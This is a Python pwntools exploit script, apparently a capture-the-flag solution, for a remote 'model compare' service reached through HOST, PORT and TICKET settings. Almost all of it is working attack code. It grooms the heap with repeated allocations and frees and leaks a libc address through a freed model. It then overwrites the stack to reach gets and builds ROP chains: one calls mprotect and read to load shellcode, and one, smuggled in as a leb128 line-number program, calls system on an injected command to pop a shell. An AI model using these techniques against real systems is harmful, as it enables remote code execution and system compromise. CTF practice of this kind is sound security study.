import os
import sys
import time
import math

DEBUG = False

HOST = os.environ.get("HOST", 'localhost')
PORT = int(os.environ.get("PORT",5555))
TICKET = os.environ.get("TICKET")

from pwn import *
import struct
import leb128

context.log_level = 'debug'
context.arch = 'amd64'

CMD = 'id; /bailout 25000000000; sleep 10000'

def make_model(a,b,c,d,e,note):
    pl = b''
    pl += str(u64(struct.pack('<d',a))).encode('latin-1') + b'|'
    pl += str(u64(struct.pack('<d',b))).encode('latin-1') + b'|'
    pl += str(u64(struct.pack('<d',c))).encode('latin-1') + b'|'
    pl += str(u64(struct.pack('<d',d))).encode('latin-1') + b'|'
    pl += str(u64(struct.pack('<d',e))).encode('latin-1') + b'|'
    pl += note
    return b'%u|%s'%(len(pl),pl)

def get_sc(sc, sock):

    p = sock

    input('enter')

    p.readuntil(b'Enter graph description')
    p.sendline(b'asdf')

    for i in range(11):
        p.readuntil(b'new model to compare')
        p.sendline(b'0')

        p.readuntil(b'Paste model')
        p.send(make_model(
            0,
            0,
            0,
            0,
            0,
            bytes([0x30 + i])*(0x110 - 5*8)
        ))

    # Free more chunks
    for i in range(8):
        p.readuntil(b'new model to compare')
        p.sendline(b'66')

        p.readuntil(b'TRASH')
        p.sendline(b'%u'%(i+1))

    # Copy ref into selected
    p.readuntil(b'new model to compare')
    p.sendline(b'10')
    p.readuntil(b'Options')
    p.sendline(b'1')

    #input('enter')

    p.readuntil(b'new model to compare')
    p.sendline(b'66')
    p.readuntil(b'TRASH')
    p.sendline(b'10')

    #input('enter')

    p.readuntil(b'new model to compare')
    p.sendline(b'66')
    p.readuntil(b'TRASH')
    p.sendline(b'9')

    #input('enter')

    p.readuntil(b'new model to compare')
    p.sendline(b'11')

    p.readuntil(b'Model #10')
    p.readuntil('r = ')
    leak = p.readuntil(' ')
    print("================", leak)
    leak = eval(leak) # xD
    print("================", leak)

    libc_leak = u64(struct.pack('<d', leak / .05))
    #libc_base = (libc_leak & ~0xfff) - 0x219000
    libc_base = (libc_leak & ~0xfff) - 0x21a000
    print('LEAK:',hex(libc_leak))
    print('LIBC:',hex(libc_base))
    input('=========================')

    # Crash
    p.readuntil(b'Options')
    p.sendline(b'1')

    p.readuntil(b'new model to compare')
    p.sendline(b'0')

    libc = ELF('./libc.so.6')
    libc.address = libc_base

    global pl
    pl = b'AAAA' #alignment
    pl += b'(): Assertion'.ljust(32,b'A')
    pl += b'A'*8
    pl += b'B'*8
    pl += b'C'*8
    #pl += b'D'*8
    #pl += p64(libc_base + 0xf6d43) # int3 ; ret
    pl += p64(libc.symbols['gets'])

    p.readuntil(b'Paste model')
    p.send(make_model(
        0,
        0,
        0,
        #math.nan,
        1.79769313486231570815e+308,
        0,
        pl
    ))

    print('Gets @ ',hex(libc.symbols['gets']))

    #input('Sent; enter')

    # Send rest of ropchain to smash stack
    pl = b'A'*8
    pl += b'B'*8
    pl += b'C'*8
    pl += b'D'*8
    #pl += p64(0x414243444546)
    #pl += p64(libc_base + 0xf6db3)


    rop = ROP(libc)
    if DEBUG:
        rop.raw(libc_base + 0xf6d43) # int3 ; ret
    rop.call(libc.symbols['mprotect'], [libc_base, 0x3000, 7])
    if DEBUG:
        rop.raw(libc_base + 0xf6d43) # int3 ; ret
    scl = len(sc)
    off = 0
    while scl > 0:
        sz = scl
        if sz > 0x100:
            sz = 0x100
        rop.call(libc.symbols['read'], [0, libc_base + off, sz])
        if DEBUG:
            rop.raw(libc_base + 0xf6d43) # int3 ; ret
        scl -= sz
        off += sz
    pl += rop.chain()

    pl += p64(libc_base)

    pl += b'F'*8
    pl += b'G'*8

    assert(b'\n' not in pl)

    input('gets payload')
    time.sleep(1)

    p.sendline(pl)

    input('read payload')
    time.sleep(1)

    for i in range(0, len(sc), 0x100):
        p.send(sc[i:i+0x100])
        input('sent %u/%u'%(i,len(sc)))

def stage1():
    global pl

    with open('exploit1.bin','rb') as f:
        sc = f.read()
    sc = b'\x90' + sc

    sock = remote(HOST, PORT)
    p = sock

    if TICKET:
        sock.readuntil(b'Ticket please: ')
        sock.sendline(TICKET.encode("latin-1"))

    get_sc(sc, sock)
    p.readuntil('flag{')
    p.readuntil('}')
    p.interactive()
    return True

def stage2():
    global pl

    with open('exploit.bin','rb') as f:
        sc = f.read()
    sc = b'\x90' + sc

    sock = remote(HOST, PORT)
    p = sock

    if TICKET:
        sock.readuntil(b'Ticket please: ')
        sock.sendline(TICKET.encode("latin-1"))

    get_sc(sc, sock)
    #p.interactive()

    #input('enter')

    p.readuntil(b'Press enter')

    #input()
    p.sendline(b'')

    p.readuntil(b'000 at ')

    leak = p.read(6).ljust(8,b'\0')
    ld_mmap_leak = u64(leak)
    print('LEAK:',hex(ld_mmap_leak))

    #libc_base = ld_mmap_leak - 0x202050 - 0x28000 -0xe0
    libc_base = ld_mmap_leak - 0x22b050# - 0xe0
    print('!!!!!!!!!!!!!!!! LIBC:',hex(libc_base))

    input('===============================')

    cmd_ptr = ld_mmap_leak - 0x1c50# - 0xe0


    if not ((libc_base&0xfff) == 0):
        raise Exception('Bad libc base') # xxx
        sock.close()
        return False

    assert((libc_base&0xfff) == 0)

    #libc = ELF('./libc.so.6')
    libc = ELF('./libc.so.6')
    libc.address = libc_base

    rop = ROP(libc)
    sh_ptr = next(libc.search(b'/bin/sh'))

    #rop.raw(libc_base + 0xf6d43) # int3 ; ret
    rop.raw(rop.find_gadget(['ret'])[0]) # Fix alignment

    #rop.system(sh_ptr)
    rop.system(cmd_ptr)
    #print(rop.dump())
    ropchain = rop.chain()
    #ropchain = p64(0x414243444546) + p64(0x414243444546) + p64(0x414243444546) + p64(0x414243444546)
    #print(hexdump(ropchain))


    #input('waiting');

    global c_addr
    c_addr = 0
    global c_line
    c_line = 0
    pl = b'\0\0\0'
    def push_16(v):
        global c_line
        global c_addr
        global pl
        assert(v < 0x10000)
        dif = v - c_line
        pl += b'\x03' + leb128.i.encode(dif)
        c_line = v

        if c_addr == 0:
            # return addr offset
            pl += b'\x02\x3c'
            c_addr = 0x3c
        else:
            pl += b'\x02\x01'
            c_addr += 1

    def push(v):
        for i in range(0,63,16):
            push_16((v>>i) & 0xffff)

    def init_line(v):
        assert(v < 0x10000)

    print("Building ropchain")
    #push(0x414243444546) # rip control
    #push(libc_base + 0xf6d43) # int3 ; ret

    for i in range(0, len(ropchain), 8):
        part = ropchain[i:i+8]
        part = u64(part)
        #print(hex(part))
        push(part)
    #push(0x565554535251)
    #push(0x616263646566)
    #print(pl)

    p.readuntil(b'Please send hax')
    #print(p.readuntil('Please send hax'))

    p.send(pl.ljust(0x100, b'\0'))

    p.readuntil(b'Please send command')
    p.send(CMD.encode('latin-1'))

    input('================ WAITING ==================')

    print("Popping shell please stand by...")
    while True:
        r = p.readline(timeout=5)
        if len(r) == 0:
            break
        print(r.decode('latin-1'),end='')
        if b'flag' in r:
            break

    p.close()

    return True

stage2()
#stage1()
#for i in range(10):
#    if stage2():
#        break





